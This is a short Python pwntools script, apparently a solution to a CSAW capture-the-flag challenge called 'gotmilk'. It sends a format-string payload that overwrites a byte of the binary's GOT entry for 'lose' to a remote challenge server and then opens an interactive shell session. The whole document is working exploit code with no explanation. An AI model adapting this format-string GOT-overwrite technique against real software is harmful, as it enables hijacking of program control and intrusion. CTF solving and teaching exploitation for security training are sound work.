from pwn import *

elf = ELF('./gotmilk')

fmt = '%137c%10$hhn'.ljust(12)
fmt += p32(elf.got.lose)

#p = process('./run.sh')
p = remote('pwn.chal.csaw.io',  1004)
p.sendline(fmt)
p.interactive()
